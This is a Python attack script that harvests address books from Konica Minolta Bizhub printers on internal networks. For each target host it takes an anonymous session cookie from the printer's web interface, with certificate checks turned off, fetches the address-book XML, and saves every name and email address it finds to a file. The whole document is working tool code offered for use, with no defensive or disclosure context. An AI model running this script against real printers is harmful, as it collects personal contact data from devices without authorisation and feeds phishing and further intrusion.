#!/usr/bin/env python3
import argparse
import requests
import sys
import json
import os
import xml.etree.ElementTree as ET

# Suppress the "InsecureRequestWarning" about verify=False
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter("ignore", InsecureRequestWarning)

CHUNK_SIZE = 50  # Number of entries to request each time

def parse_args():
    parser = argparse.ArgumentParser(description="Fetch address book from internal network printers (Bizhub).")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--ip", help="Single IP or hostname.")
    group.add_argument("--list", help="File containing a list of IPs/hosts (one per line).")
    parser.add_argument("-d", "--debug", action="store_true", help="Print debug info, including response details and cookie info.")
    return parser.parse_args()

def auto_get_cookie(host, debug=False):
    """Attempt to get a cookie, first using HTTPS. If it fails, fall back to HTTP."""
    for protocol in ["https", "http"]:
        url = f"{protocol}://{host}/wcd/index.html"
        session = requests.Session()
        try:
            r = session.get(url, verify=False, timeout=10)
            if debug:
                print(f"[DEBUG] GET {url} -> status {r.status_code}")
                print("[DEBUG] Response headers:\n", r.headers)
                print("[DEBUG] Response body:\n", r.text[:400] + ("..." if len(r.text) > 400 else ""))

            r.raise_for_status()
            if "ID" in session.cookies:
                cookie_value = session.cookies.get_dict().get("ID", "")
                if debug:
                    print(f"[DEBUG] Auto-fetched cookie over {protocol.upper()} for {host}: ID={cookie_value}")
                return session, protocol, cookie_value  # Return session, protocol, and cookie value

        except requests.exceptions.RequestException as e:
            if debug:
                print(f"[DEBUG] Error fetching cookie from {protocol}://{host}: {e}")
            continue  # Try the next protocol

    print(f"[!] Failed to retrieve an ID cookie over both HTTPS and HTTP for {host}.")
    return None, None, None

def fetch_abbr_chunk(host, protocol, session=None, cookie_value=None, debug=False):
    """Fetch the full address book XML using the detected working protocol."""
    url = f"{protocol}://{host}/wcd/abbr.xml"
    headers = {"Cookie": f"ID={cookie_value}"} if cookie_value else {}

    try:
        if session:
            if debug:
                print(f"[DEBUG] Fetching address book using session cookie over {protocol.upper()}.")
            resp = session.get(url, headers=headers, verify=False, timeout=15)
        else:
            if debug:
                print(f"[DEBUG] Fetching address book over {protocol.upper()} with headers:", headers)
            resp = requests.get(url, headers=headers, verify=False, timeout=15)

        if debug:
            print(f"[DEBUG] Response status: {resp.status_code}")
            print(f"[DEBUG] Response body (first 1000 chars):\n{resp.text[:1000]}")

        if resp.status_code == 200:
            return resp.text  # Return raw XML response
        else:
            if debug:
                print("[DEBUG] Non-200 status code:", resp.status_code)
                print("[DEBUG] Body snippet:", resp.text[:300])
            return None
    except requests.exceptions.RequestException as e:
        if debug:
            print(f"[DEBUG] RequestException fetching XML: {e}")
        return None

def parse_xml(xml_data, debug=False):
    """Extract Name and Email from the XML response correctly."""
    try:
        root = ET.fromstring(xml_data)

        # Locate <Address>
        address_section = root.find(".//Address")
        if address_section is None:
            if debug:
                print(f"[DEBUG] No <Address> block found in XML.")
                print(f"[DEBUG] XML Response snippet:\n{xml_data[:1000]}")
            return []

        abbr_list = address_section.find("AbbrList")
        if abbr_list is None:
            if debug:
                print(f"[DEBUG] No <AbbrList> found inside <Address>.")
            return []

        parsed_data = []
        for abbr in abbr_list.findall("Abbr"):
            # Get Name
            name_element = abbr.find("Name")
            name = name_element.text.strip() if name_element is not None else "Unknown"

            # Get Email
            send_config = abbr.find("SendConfiguration")
            email = "No Email"
            if send_config is not None:
                address_info = send_config.find("AddressInfo")
                if address_info is not None:
                    email_mode = address_info.find("EmailMode")
                    if email_mode is not None:
                        to_element = email_mode.find("To")
                        email = to_element.text.strip() if to_element is not None else "No Email"

            parsed_data.append((name, email))

            if debug:
                print(f"[DEBUG] Extracted Name: {name}, Email: {email}")

        return parsed_data

    except ET.ParseError as e:
        if debug:
            print(f"[DEBUG] XML parsing error: {e}")
        return []

def process_host(host, debug=False):
    """Handles the full address book extraction for a single host."""
    session, protocol, cookie_value = auto_get_cookie(host, debug=debug)
    if not session:
        return

    xml_data = fetch_abbr_chunk(host, protocol, session=session, cookie_value=cookie_value, debug=debug)
    if not xml_data:
        print(f"[!] No XML data retrieved for {host}.")
        return

    abbr_list = parse_xml(xml_data, debug=debug)

    if not abbr_list:
        print(f"[!] No address book entries found for {host}.")
        return

    output_file = f"{host}_addrbook.txt"
    with open(output_file, "w", encoding="utf-8") as f:
        for name, email in abbr_list:
            f.write(f"{name},{email}\n")

    print(f"[+] Extracted {len(abbr_list)} records from {host} -> {output_file}")

def main():
    parser = parse_args()

    hosts = [parser.ip] if parser.ip else open(parser.list).read().splitlines()

    for host in hosts:
        host = host.strip()
        if host:
            process_host(host, debug=parser.debug)

if __name__ == "__main__":
    main()
